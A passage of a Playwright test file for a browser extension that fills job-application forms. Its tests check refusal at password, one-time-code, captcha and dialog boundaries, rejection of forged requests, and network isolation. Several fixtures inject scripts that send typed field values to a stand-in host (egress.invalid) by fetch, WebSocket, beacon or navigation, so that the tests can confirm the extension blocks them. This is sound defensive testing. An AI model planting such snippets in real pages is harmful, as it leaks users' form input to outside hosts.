import { test, expect, type Page } from "@playwright/test";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PUBLIC_SOURCES } from "../../../apps/extension/test/m02-w14/public-inspection/scope.ts";
import {
  PREPARE,
  EXECUTE,
  parseContactRequest,
} from "../../../apps/extension/test/m02-w14/public-contact/protocol.ts";
import {
  isCanonicalFieldDecision,
  buildExecuteTabRequest,
} from "../../../apps/extension/src/driver-protocol.ts";
import { buildTransaction, fillDecision } from "../support/research-harness.ts";
import {
  launchContact,
  waitReadOnlyNetworkDrain,
  measureControls,
  freezePlan,
  prepareContact,
  executeContact,
  reconcileContact,
  runtimeMessage,
  requireObserved,
  readOracle,
  type IndependentPageOracle,
  type ContactSession,
  type PhysicalControl,
} from "./contact-harness.ts";
import { sha256Canonical } from "../../../packages/evaluation-runner/src/canonical.ts";
import {
  accountControlUnion,
  contactDomMetrics,
  hasCompleteControlCoverage,
  type ControlAccounting,
} from "./control-accounting.ts";
const source = requireObserved(
  PUBLIC_SOURCES.find((row) => row.ats === "GREENHOUSE"),
);
const HTML =
  '<!doctype html><html><body><form><h2>Application</h2><label for="first">First name</label><input id="first" autocomplete="given-name" required><label for="email">Email</label><input id="email" type="email" autocomplete="email" required><label for="referee">Referee name</label><input id="referee"><button type="submit">Submit application</button></form></body></html>';
// Controlled proof expectations are authored from literal markup before the
// candidate is called. No candidate concept/decision appears in this oracle.
const expected: IndependentPageOracle = {
  evidence_row_id: "CONTROLLED_CONTACT",
  url: source.url,
  source: "CONTROLLED_SYNTHETIC_FIXTURE",
  positive: [
    {
      match: {
        label: "First name",
        tag: "INPUT",
        type: "text",
        role: null,
        visible: true,
        required: true,
        disabled: false,
        autocomplete: "given-name",
      },
      concept: "FIRST_NAME",
      value: "Synthetic",
      source: "CONTROLLED:first",
    },
    {
      match: {
        label: "Email",
        tag: "INPUT",
        type: "email",
        role: null,
        visible: true,
        required: true,
        disabled: false,
        autocomplete: "email",
      },
      concept: "EMAIL_ADDRESS",
      value: "synthetic@example.invalid",
      source: "CONTROLLED:email",
    },
  ],
  negative: [],
};
async function fixture(session: ContactSession, html = HTML) {
  const page = await session.context.newPage();
  // This is only controlled proof setup. The public runner never substitutes
  // HTML or rerenders a real public page.
  await page.route("**/*", (route) =>
    route.fulfill({ status: 200, contentType: "text/html", body: html }),
  );
  await page.goto(source.url);
  return page;
}
async function prepared(
  session: ContactSession,
  page: Page,
  directory: string,
  id: string,
) {
  await session.closeNetwork();
  const frozen = await freezePlan(
    session,
    page,
    expected,
    id,
    join(directory, `${id}.json`),
  );
  expect(frozen.state).toBe("FROZEN");
  if (frozen.state !== "FROZEN") throw new Error("controlled freeze refused");
  const reply = (await prepareContact(
    session,
    frozen.observation.tabId,
    frozen.plan,
    id,
  )) as { state: string; reason: string; plan_id: string };
  return {
    frozen,
    reply,
    tabId: frozen.observation.tabId,
    frame: requireObserved(frozen.observation.scan?.frames[0]),
  };
}
async function deniedWire(session: ContactSession, message: unknown) {
  try {
    return await runtimeMessage(session.controller, message);
  } catch {
    return undefined;
  }
}

test("literal visible labels retain required markers without overriding fresh ownership policy", async () => {
  for (const ariaLabel of ["First name", "Employer first name"]) {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-label-proof-"));
    try {
      const html = HTML.replace(
        'for="first">First name</label>',
        'for="first">First name*</label>',
      ).replace(
        '<input id="first"',
        `<input aria-label="${ariaLabel}" id="first"`,
      );
      const page = await fixture(session, html);
      const literalOracle = {
        ...expected,
        positive: expected.positive.map((item) =>
          item.concept === "FIRST_NAME"
            ? { ...item, match: { ...item.match, label: "First name*" } }
            : item,
        ),
      };
      const measured = await measureControls(page);
      const first = measured.filter(
        (item) => item.match.label === "First name*",
      );
      expect(first).toHaveLength(1);
      expect(first[0]?.label_observation?.primary_source).toBe("NATIVE_LABEL");
      expect(first[0]?.label_observation?.aria_label).toBe(ariaLabel);
      await session.closeNetwork();
      const frozen = await freezePlan(
        session,
        page,
        literalOracle,
        "label-channels",
        join(directory, "before.json"),
      );
      expect(frozen.state).toBe("FROZEN");
      if (frozen.state !== "FROZEN")
        throw new Error("literal channel not frozen");
      const grant = (await prepareContact(
        session,
        frozen.observation.tabId,
        frozen.plan,
        "label-channels",
      )) as { state: string; plan_id: string };
      expect(grant.state).toBe("PREPARED");
      const frame = requireObserved(frozen.observation.scan?.frames[0]);
      const field = requireObserved(frame.descriptors[0]);
      const result = (await executeContact(
        session,
        frozen.observation.tabId,
        grant.plan_id,
        field,
        "label-first",
      )) as { state: string; result?: { outcome: string } };
      if (ariaLabel === "First name") {
        expect(result.state).toBe("EXECUTED");
        expect(result.result?.outcome).toBe("VERIFIED");
        await expect(page.locator("#first")).toHaveValue("Synthetic");
      } else {
        expect(["ABSTAINED", "BLOCKED"]).toContain(result.state);
        await expect(page.locator("#first")).toHaveValue("");
      }
      await expect(page.locator("#email")).toHaveValue("");
      await expect(page.locator("#referee")).toHaveValue("");
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  }
});

test("fixed synthetic contact policy, real transaction, reconciliation, negative semantics and duplicate rejection", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(session);
    let submits = 0;
    await page.exposeBinding("recordSubmit", () => {
      submits++;
    });
    await page.evaluate(() => {
      document.addEventListener("submit", () => {
        void (
          globalThis as unknown as { recordSubmit(): Promise<void> }
        ).recordSubmit();
      });
    });
    const result = await prepared(session, page, directory, "positive");
    expect(result.reply.state).toBe("PREPARED");
    const persisted = JSON.parse(
      readFileSync(join(directory, "positive.json"), "utf8"),
    ) as { candidate_w09_executed: boolean; independent_digest: string };
    expect(persisted.candidate_w09_executed).toBe(false);
    expect(persisted.independent_digest).toBe(
      result.frozen.plan.independent_oracle_digest,
    );
    for (const field of result.frame.descriptors) {
      const execution = (await executeContact(
        session,
        result.tabId,
        result.reply.plan_id,
        field,
        `positive-${field.field_id}`,
      )) as { state: string; reason: string; result?: { outcome: string } };
      expect(execution.state).toBe(
        field.label.normalized_text === "Referee name"
          ? "ABSTAINED"
          : "EXECUTED",
      );
      if (execution.state === "EXECUTED")
        expect(execution.result?.outcome).toBe("VERIFIED");
    }
    await expect(page.locator("#first")).toHaveValue("Synthetic");
    await expect(page.locator("#email")).toHaveValue(
      "synthetic@example.invalid",
    );
    await expect(page.locator("#referee")).toHaveValue("");
    const field = requireObserved(result.frame.descriptors[0]);
    expect(
      (
        (await executeContact(
          session,
          result.tabId,
          result.reply.plan_id,
          field,
          "duplicate",
        )) as { reason: string }
      ).reason,
    ).toBe("FIELD_ALREADY_ATTEMPTED");
    const transaction = await buildTransaction(
      field,
      { kind: "TEXT", text: "Unauthorized arbitrary value" },
      await fillDecision(field, "public-direct-refusal"),
      "public-direct-refusal",
    );
    expect(
      await deniedWire(
        session,
        buildExecuteTabRequest("direct-refused", result.tabId, transaction),
      ),
    ).toBeUndefined();
    expect(
      await deniedWire(session, {
        kind: EXECUTE,
        version: 1,
        requestId: "extra-value",
        tabId: result.tabId,
        plan_id: result.reply.plan_id,
        field_id: field.field_id,
        intended: "arbitrary",
      }),
    ).toBeUndefined();
    const reconciled = await reconcileContact(
      session,
      result.tabId,
      result.frame.frame_context.frame_id,
      "positive",
    );
    expect(reconciled?.outcome.status).toBe("RECONCILED");
    expect(submits).toBe(0);
    expect(session.network).toEqual([]);
    await page.evaluate(() => {
      history.replaceState(null, "", "/unapproved-job");
    });
    expect(
      await deniedWire(session, {
        kind: EXECUTE,
        version: 1,
        requestId: "changed-url",
        tabId: result.tabId,
        plan_id: result.reply.plan_id,
        field_id: requireObserved(result.frame.descriptors[1]).field_id,
      }),
    ).toBeUndefined();
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("network-open and altered before-scan/profile plans refuse, concurrent prepare preserves one freeze", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(session);
    await session.closeNetwork();
    const frozen = await freezePlan(
      session,
      page,
      expected,
      "binding",
      join(directory, "binding.json"),
    );
    if (frozen.state !== "FROZEN") throw new Error("freeze refused");
    const tabId = frozen.observation.tabId;
    await session.context.setOffline(false);
    expect(
      (
        (await prepareContact(session, tabId, frozen.plan, "online")) as {
          reason: string;
        }
      ).reason,
    ).toBe("NETWORK_ISOLATION_REQUIRED");
    await session.context.setOffline(true);
    for (const key of ["profile_digest", "before_scan_digest"] as const)
      expect(
        (
          (await prepareContact(
            session,
            tabId,
            { ...frozen.plan, [key]: `sha256:${"0".repeat(64)}` },
            key,
          )) as { state: string }
        ).state,
      ).toBe("BLOCKED");
    const requests = ["first", "second"].map((id) =>
      prepareContact(session, tabId, frozen.plan, id),
    );
    const replies = (await Promise.all(requests)) as {
      state: string;
      plan_id: string;
    }[];
    expect(replies.filter((reply) => reply.state === "PREPARED")).toHaveLength(
      1,
    );
    expect(replies.filter((reply) => reply.state === "BLOCKED")).toHaveLength(
      1,
    );
    const accepted = requireObserved(
      replies.find((reply) => reply.state === "PREPARED"),
    );
    expect(
      (
        (await executeContact(
          session,
          tabId,
          accepted.plan_id,
          requireObserved(
            requireObserved(frozen.observation.scan?.frames[0]).descriptors[0],
          ),
          "after-concurrent",
        )) as { state: string }
      ).state,
    ).toBe("EXECUTED");
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

for (const [name, boundary] of [
  [
    "tokenized-username-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-login USERNAME">',
  ],
  [
    "tokenized-webauthn-mislabel",
    '<label for="auth">First name</label><input id="auth" autocomplete="section-login email WebAuthn">',
  ],
  [
    "tokenized-otp-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-login ONE-TIME-CODE">',
  ],
  [
    "tokenized-current-password-mislabel",
    '<label for="auth">First name</label><input id="auth" autocomplete="section-login current-password">',
  ],
  [
    "tokenized-new-password-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-register&#9;new-password">',
  ],
  ["generic-dialog", '<div role="dialog">Continue</div>'],
  ["generic-alertdialog", '<div role="alertdialog">Continue</div>'],
  ["generic-aria-modal", '<section aria-modal="true">Continue</section>'],
  ["generic-native-dialog", "<dialog open>Continue</dialog>"],
  ["password", '<input type="password">'],
  [
    "labelled-code",
    '<label for="code">Verification code</label><input id="code">',
  ],
  ["native-dialog", "<dialog open>Verify your identity</dialog>"],
  [
    "compact-challenge",
    '<iframe title="captcha challenge" style="width:80px;height:60px" src="about:blank"></iframe>',
  ],
] as const)
  test(`active ${name} boundary refuses preparation without writes`, async () => {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
    try {
      const page = await fixture(
        session,
        HTML.replace("</form>", `${boundary}</form>`),
      );
      const result = await prepared(session, page, directory, name);
      expect(result.reply.state).toBe("BLOCKED");
      await expect(page.locator("#first")).toHaveValue("");
      await expect(page.locator("#email")).toHaveValue("");
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  });

for (const [name, focus] of [
  [
    "tokenized-username",
    "document.querySelector('#first').autocomplete='section-login USERNAME'",
  ],
  [
    "tokenized-webauthn",
    "document.querySelector('#first').autocomplete='section-login email WebAuthn'",
  ],
  [
    "tokenized-otp",
    "document.querySelector('#first').autocomplete='section-login ONE-TIME-CODE'",
  ],
  [
    "tokenized-current-password",
    "document.querySelector('#first').autocomplete='section-login current-password'",
  ],
  [
    "tokenized-new-password",
    "document.querySelector('#first').autocomplete='section-register new-password'",
  ],
  [
    "generic-modal",
    "const x=document.createElement('div');x.setAttribute('role','dialog');x.textContent='Continue';document.body.append(x)",
  ],
  [
    "shadow-markup",
    "document.querySelector('#focus-shadow').shadowRoot.querySelector('span').textContent='Changed'",
  ],
  [
    "shadow-password",
    "const x=document.createElement('div');document.body.append(x);x.attachShadow({mode:'open'}).innerHTML='<input type=password>'",
  ],
  [
    "password",
    "const x=document.createElement('input');x.type='password';document.body.append(x)",
  ],
  [
    "repurpose",
    "document.querySelector('label[for=first]').textContent='Referee name'",
  ],
  ["inert", "document.querySelector('form').inert=true"],
] as const)
  test(`focus-time ${name} refuses setter and automatic recovery`, async () => {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
    try {
      const page = await fixture(
        session,
        HTML.replace(
          "</body>",
          `<div id="focus-shadow"></div><script>document.querySelector('#focus-shadow').attachShadow({mode:'open'}).innerHTML='<span>Original</span>';document.querySelector('#first').addEventListener('focus',()=>{${focus}});window.fieldEvents=0;window.blurEvents=0;document.querySelector('#first').addEventListener('blur',()=>window.blurEvents++);document.addEventListener('input',()=>window.fieldEvents++);document.addEventListener('change',()=>window.fieldEvents++);</script></body>`,
        ),
      );
      const result = await prepared(session, page, directory, `focus-${name}`);
      expect(result.reply.state).toBe("PREPARED");
      const field = requireObserved(
        result.frame.descriptors.find(
          (item) => item.label.normalized_text === "First name",
        ),
      );
      const action = (await executeContact(
        session,
        result.tabId,
        result.reply.plan_id,
        field,
        `focus-${name}`,
      )) as { result: { outcome: string } };
      expect(action.result.outcome).toBe("FAILED");
      await expect(page.locator("#first")).toHaveValue("");
      expect(
        await page.evaluate(
          () => (globalThis as Record<string, unknown>).fieldEvents,
        ),
      ).toBe(0);
      if (name !== "inert")
        expect(
          await page.evaluate(
            () => (globalThis as Record<string, unknown>).blurEvents,
          ),
        ).toBe(0);
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  });

test("preexisting contact value stays preserved and stale site rejection remains rejected", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(
      session,
      HTML.replace('id="first"', 'id="first" value="Existing"').replace(
        'id="email"',
        'id="email" aria-invalid="true"',
      ),
    );
    const result = await prepared(session, page, directory, "preservation");
    for (const field of result.frame.descriptors)
      await executeContact(
        session,
        result.tabId,
        result.reply.plan_id,
        field,
        `preserve-${field.field_id}`,
      );
    await expect(page.locator("#first")).toHaveValue("Existing");
    await expect(page.locator("#email")).toHaveValue(
      "synthetic@example.invalid",
    );
    const reconciled = await reconcileContact(
      session,
      result.tabId,
      result.frame.frame_context.frame_id,
      "preservation",
    );
    expect(reconciled).not.toBeNull();
    expect(await page.locator("#email").getAttribute("aria-invalid")).toBe(
      "true",
    );
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("site-owned autosave cannot send an HTTP body during action phase", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(
      session,
      HTML.replace(
        "</body>",
        '<script>document.querySelector("#first").addEventListener("input",()=>{fetch("https://egress.invalid/autosave",{method:"POST",body:document.querySelector("#first").value}).catch(()=>{});new WebSocket("wss://egress.invalid/autosave");});</script></body>',
      ),
    );
    // Remove the controlled setup route before actions; network isolation must
    // own every attempted request rather than the fixture fulfillment route.
    const result = await prepared(session, page, directory, "autosave");
    await page.unroute("**/*");
    const failed: string[] = [];
    page.on("requestfailed", (request) => failed.push(request.method()));
    const field = requireObserved(
      result.frame.descriptors.find(
        (item) => item.label.normalized_text === "First name",
      ),
    );
    await executeContact(
      session,
      result.tabId,
      result.reply.plan_id,
      field,
      "autosave",
    );
    await page.waitForTimeout(100);
    expect(session.closed).toBe(true);
    expect(
      session.network.some(
        (entry) => entry.kind === "HTTP_BLOCKED" && entry.method === "POST",
      ) || failed.includes("POST"),
    ).toBe(true);
    expect(
      session.network.some((entry) => entry.kind === "WEBSOCKET_BLOCKED"),
    ).toBe(true);
    expect(
      session.network.every((entry) => !Object.hasOwn(entry, "body")),
    ).toBe(true);
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

for (const label of ["Social Security Number", "Employer first name"])
  test(`forged canonical contact decision cannot authorize ${label}`, async () => {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
    try {
      const page = await fixture(
        session,
        HTML.replace(
          "</form>",
          `<label for="forged">${label}</label><input id="forged"></form>`,
        ),
      );
      const result = await prepared(session, page, directory, "forgery");
      const field = requireObserved(
        result.frame.descriptors.find(
          (item) => item.label.normalized_text === label,
        ),
      );
      const decision = await fillDecision(field, `forged-${label}`);
      expect(isCanonicalFieldDecision(decision)).toBe(true);
      const reply = (await runtimeMessage(session.controller, {
        kind: EXECUTE,
        version: 1,
        requestId: "forged-authority",
        tabId: result.tabId,
        plan_id: result.reply.plan_id,
        field_id: field.field_id,
        decision,
      })) as { state: string; reason: string };
      expect(reply.state).toBe("BLOCKED");
      expect(reply.reason).toBe("LIVE_CONTACT_CLASSIFICATION_MISMATCH");
      await expect(page.locator("#forged")).toHaveValue("");
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  });

test("default loopback and inspect-only builds refuse a canonical contact preparation", async () => {
  const {
    launchInspection,
    DEFAULT_EXTENSION_DIST,
    PUBLIC_EXTENSION_DIST,
    tabIdForPage,
  } = await import("../public-research/inspection-harness.ts");
  const contact = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(contact);
    const initial = await prepared(contact, page, directory, "isolation");
    for (const build of [DEFAULT_EXTENSION_DIST, PUBLIC_EXTENSION_DIST]) {
      const inspector = await launchInspection(build);
      try {
        const observed = await inspector.context.newPage();
        await observed.route("**/*", (route) =>
          route.fulfill({ status: 200, contentType: "text/html", body: HTML }),
        );
        await observed.goto(source.url);
        const wire = {
          kind: PREPARE,
          version: 1,
          requestId: "isolation",
          tabId: await tabIdForPage(inspector.worker, observed),
          plan: initial.frozen.plan,
        };
        expect(parseContactRequest(wire)).not.toBeNull();
        let reply: unknown;
        try {
          reply = await runtimeMessage(inspector.controller, wire);
        } catch {
          reply = undefined;
        }
        expect(reply).toBeUndefined();
        await expect(observed.locator("#first")).toHaveValue("");
        await expect(observed.locator("#email")).toHaveValue("");
      } finally {
        await inspector.cleanup();
      }
    }
  } finally {
    await contact.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

for (const [name, markup] of [
  [
    "tokenized-username-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-login USERNAME">',
  ],
  [
    "tokenized-webauthn-mislabel",
    '<label for="auth">First name</label><input id="auth" autocomplete="section-login email WebAuthn">',
  ],
  [
    "tokenized-otp-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-login ONE-TIME-CODE">',
  ],
  [
    "tokenized-current-password-mislabel",
    '<label for="auth">First name</label><input id="auth" autocomplete="section-login current-password">',
  ],
  [
    "tokenized-new-password-mislabel",
    '<label for="auth">Email</label><input id="auth" type="email" autocomplete="section-register new-password">',
  ],
  [
    "generic-dialog-shadow-text",
    '<div role="dialog"><div id="inner"></div></div>',
  ],
  ["password", '<input type="password">'],
  [
    "local-idref-code",
    '<span id="auth-label">Verification code</span><input aria-labelledby="auth-label">',
  ],
  [
    "challenge",
    '<iframe title="captcha challenge" style="width:80px;height:60px" src="about:blank"></iframe>',
  ],
  ["dialog", "<dialog open>Verify your identity</dialog>"],
] as const)
  test(`open shadow ${name} is a protected no-write boundary`, async () => {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
    try {
      const shadowScript = `<div id="protected-shadow"></div><script>const root=document.querySelector('#protected-shadow').attachShadow({mode:'open'});root.innerHTML=${JSON.stringify(markup)};const inner=root.querySelector('#inner');if(inner)inner.attachShadow({mode:'open'}).innerHTML='<span>Continue</span>';</script>`;
      const page = await fixture(
        session,
        HTML.replace("</body>", `${shadowScript}</body>`),
      );
      const result = await prepared(session, page, directory, `shadow-${name}`);
      expect(result.reply.state).toBe("BLOCKED");
      await expect(page.locator("#first")).toHaveValue("");
      await expect(page.locator("#email")).toHaveValue("");
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  });

test("open-tree boundary capacity fails closed before any setter", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(session);
    await session.closeNetwork();
    const frozen = await freezePlan(
      session,
      page,
      expected,
      "capacity",
      join(directory, "capacity.json"),
    );
    if (frozen.state !== "FROZEN") throw new Error("freeze refused");
    await page.evaluate(() => {
      const fragment = document.createDocumentFragment();
      for (let i = 0; i < 16385; i++)
        fragment.append(document.createElement("span"));
      document.body.append(fragment);
    });
    const reply = (await prepareContact(
      session,
      frozen.observation.tabId,
      frozen.plan,
      "capacity",
    )) as { state: string; reason: string };
    expect(reply.state).toBe("BLOCKED");
    expect(reply.reason).toBe("PROTECTED_BOUNDARY_CAPACITY_EXCEEDED");
    await expect(page.locator("#first")).toHaveValue("");
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("independent oracle archive and derived map retain exact frozen bindings", () => {
  const oracle = readOracle();
  expect(oracle.original_digest).toBe(
    "sha256:e2383c2aa795f2f876063dc7c7b72d7fd2ea969004db05deca6ba08a86b8ce82",
  );
  expect(oracle.map.pages).toHaveLength(30);
  expect(
    oracle.map.pages.reduce((count, page) => count + page.positive.length, 0),
  ).toBe(73);
  expect(
    oracle.map.pages.reduce(
      (count, page) =>
        count + page.positive.filter((item) => item.match.required).length,
      0,
    ),
  ).toBe(61);
});

test("hidden credential tokens and hidden dialogs stay untouched while ordinary contact executes", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(
      session,
      HTML.replace(
        "</form>",
        '<input id="hidden-auth" autocomplete="section-login current-password" value="Existing secret stand-in" hidden><div role="dialog" hidden>Continue</div></form>',
      ),
    );
    const result = await prepared(session, page, directory, "hidden-boundary");
    expect(result.reply.state).toBe("PREPARED");
    for (const field of result.frame.descriptors.filter((item) =>
      result.frozen.plan.fields.some(
        (entry) => entry.field_id === item.field_id,
      ),
    ))
      await executeContact(
        session,
        result.tabId,
        result.reply.plan_id,
        field,
        `hidden-${field.field_id}`,
      );
    await expect(page.locator("#first")).toHaveValue("Synthetic");
    await expect(page.locator("#email")).toHaveValue(
      "synthetic@example.invalid",
    );
    await expect(page.locator("#hidden-auth")).toHaveValue(
      "Existing secret stand-in",
    );
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("site-owned beacon cannot send an HTTP body during action phase", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  try {
    const page = await fixture(
      session,
      HTML.replace(
        "</body>",
        '<script>document.querySelector("#first").addEventListener("input",()=>navigator.sendBeacon("https://egress.invalid/beacon",document.querySelector("#first").value));</script></body>',
      ),
    );
    const result = await prepared(session, page, directory, "beacon");
    await page.unroute("**/*");
    const failed: string[] = [];
    page.on("requestfailed", (request) => failed.push(request.method()));
    const field = requireObserved(
      result.frame.descriptors.find(
        (item) => item.label.normalized_text === "First name",
      ),
    );
    await executeContact(
      session,
      result.tabId,
      result.reply.plan_id,
      field,
      "beacon",
    );
    await page.waitForTimeout(100);
    expect(
      session.network.some(
        (entry) => entry.kind === "HTTP_BLOCKED" && entry.method === "POST",
      ) || failed.includes("POST"),
    ).toBe(true);
    expect(
      session.network.every((entry) => !Object.hasOwn(entry, "body")),
    ).toBe(true);
  } finally {
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

for (const [name, action] of [
  ["navigation", "location.href='https://egress.invalid/final-action'"],
  ["popup", "window.open('https://egress.invalid/final-action')"],
] as const)
  test(`site-owned ${name} request is blocked by context network enforcement`, async () => {
    const session = await launchContact();
    const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
    try {
      const page = await fixture(
        session,
        HTML.replace(
          "</body>",
          `<script>document.querySelector('#first').addEventListener('input',()=>{${action}});</script></body>`,
        ),
      );
      const result = await prepared(session, page, directory, name);
      await page.unroute("**/*");
      const field = requireObserved(
        result.frame.descriptors.find(
          (item) => item.label.normalized_text === "First name",
        ),
      );
      try {
        await executeContact(
          session,
          result.tabId,
          result.reply.plan_id,
          field,
          name,
        );
      } catch {
        /* The page may destroy its extension context on a refused navigation. */
      }
      await new Promise((resolve) => setTimeout(resolve, 100));
      expect(
        session.network.some(
          (entry) => entry.kind === "HTTP_BLOCKED" && entry.method === "GET",
        ),
      ).toBe(true);
    } finally {
      await session.cleanup();
      rmSync(directory, { recursive: true, force: true });
    }
  });

test("outstanding initial HTTP causes explicit refusal before contact writes", async () => {
  const session = await launchContact();
  const directory = mkdtempSync(join(tmpdir(), "w14-contact-proof-"));
  const heldRoutes = new Map<string, import("@playwright/test").Route>();
  let release: (() => void) | undefined;
  const seen = new Promise<void>((resolve) => {
    release = resolve;
  });
  try {
    const page = await fixture(session);
    await page.unroute("**/*");
    await session.context.route("https://pending.invalid/**", async (route) => {
      heldRoutes.set("pending", route);
      release?.();
      await new Promise<void>((resolve) => {
        release = resolve;
      });
    });
    await page.evaluate(() => {
      void fetch("https://pending.invalid/stream").catch(() => undefined);
    });
    await seen;
    const heldDrain = await waitReadOnlyNetworkDrain(session, page);
    expect(heldDrain.state).toBe("PENDING_AT_BUDGET");
    expect(heldDrain.final_pending_http_requests).toBeGreaterThan(0);
    expect(heldDrain.polls).toBeLessThanOrEqual(100);
    expect(session.closed).toBe(false);
    let refused = false;
    try {
      await session.closeNetwork();
    } catch {
      refused = true;
    }
    expect(refused).toBe(true);
    expect(session.closed).toBe(false);
    expect(session.closure.state).toBe("REFUSED_PENDING_HTTP");
    expect(session.closure.pending_http_requests).toBeGreaterThan(0);
    const { closeNetworkForObservation } = await import("./runner-evidence.ts");
    expect(
      await closeNetworkForObservation({
        close: () => session.closeNetwork(),
        snapshot: () => ({ closed: session.closed, closure: session.closure }),
      }),
    ).toEqual({ state: "REFUSED_PENDING_HTTP" });
    // A matching stale state cannot turn another operational failure into a
    // normal refusal. Preserve the original error and stop the campaign.
    const unexpected = new Error("unexpected closure failure");
    await expect(
      closeNetworkForObservation({
        close: () => Promise.reject(unexpected),
        snapshot: () => ({ closed: false, closure: session.closure }),
      }),
    ).rejects.toBe(unexpected);
    const claimedPending = new Error(
      "W14_PENDING_HTTP_REFUSES_NETWORK_CLOSURE",
    );
    for (const pending of [0, -1, 0.5])
      await expect(
        closeNetworkForObservation({
          close: () => Promise.reject(claimedPending),
          snapshot: () => ({
            closed: false,
            closure: { ...session.closure, pending_http_requests: pending },
          }),
        }),
      ).rejects.toBe(claimedPending);
    for (const snapshot of [
      { closed: true, closure: session.closure },
      {
        closed: false,
        closure: { ...session.closure, state: "OPEN" as const },
      },
    ])
      await expect(
        closeNetworkForObservation({
          close: () => Promise.reject(claimedPending),
          snapshot: () => snapshot,
        }),
      ).rejects.toBe(claimedPending);
    await expect(
      closeNetworkForObservation({
        close: () => Promise.resolve(),
        snapshot: () => ({ closed: false, closure: session.closure }),
      }),
    ).rejects.toThrow("W14_NETWORK_CLOSURE_NOT_CONFIRMED");
    await expect(page.locator("#first")).toHaveValue("");
    await expect(page.locator("#email")).toHaveValue("");
    // Natural completion may settle startup traffic. It still grants no write
    // authority: the same strict closure fence must succeed independently.
    const pendingRoute = requireObserved(heldRoutes.get("pending"));
    heldRoutes.delete("pending");
    const completion = page.waitForTimeout(100).then(async () => {
      await pendingRoute.fulfill({ status: 200, body: "finished" });
      release?.();
    });
    const settledDrain = await waitReadOnlyNetworkDrain(session, page);
    await completion;
    expect(settledDrain.state).toBe("QUIESCENT");
    expect(settledDrain.final_pending_http_requests).toBe(0);
    expect(session.closed).toBe(false);
    expect(
      await closeNetworkForObservation({
        close: () => session.closeNetwork(),
        snapshot: () => ({ closed: session.closed, closure: session.closure }),
      }),
    ).toEqual({ state: "CLOSED" });
    await expect(page.locator("#first")).toHaveValue("");
    await expect(page.locator("#email")).toHaveValue("");
  } finally {
    const heldRoute = heldRoutes.get("pending");
    if (heldRoute !== undefined) await heldRoute.abort();
    release?.();
    await session.cleanup();
    rmSync(directory, { recursive: true, force: true });
  }
});

test("runner launch failure journals an incomplete row without invented zero observations", async () => {
  const { captureRunnerPage, actionObservationSnapshot } =
    await import("./runner-evidence.ts");
  const journal: unknown[] = [];
  const captured = await captureRunnerPage({
    source: { id: "launch" },
    launch: () => Promise.reject(new Error("sensitive unretained detail")),
    observe: () => {
      throw new Error("must not observe");
    },
    snapshot: () =>
      actionObservationSnapshot(
        { input: 0, change: 0, click: 0, submit: 0 },
        null,
        false,
        0,
      ),
    cleanup: () => {
      throw new Error("must not clean unlaunched session");
    },
    writeRow: (row) => {
      journal.push(row);
    },
  });
  expect(captured.can_continue).toBe(false);
  expect(journal).toHaveLength(1);
  expect(captured.row.action_phase_events).toBeNull();
  expect(captured.row.action_phase_navigations).toBeNull();
  expect(captured.row.natural_site_acceptance).toBeNull();
  expect(captured.failures).toEqual([
    { stage: "LAUNCH", code: "OPERATION_FAILED" },
  ]);
  expect(JSON.stringify(captured.row)).not.toContain(
    "sensitive unretained detail",
  );
});

test("runner observation failure preserves known submit and navigation counters", async () => {
  const { captureRunnerPage, actionObservationSnapshot } =
    await import("./runner-evidence.ts");
  let cleaned = false;
  const journal: unknown[] = [];
  const captured = await captureRunnerPage({
    source: { id: "observe" },
    launch: () => Promise.resolve({ id: 1 }),
    observe: () => Promise.reject(new Error("measurement failed")),
    snapshot: () =>
      actionObservationSnapshot(
        { input: 2, change: 2, click: 1, submit: 3 },
        { input: 0, change: 0, click: 0, submit: 1 },
        true,
        1,
      ),
    cleanup: () => {
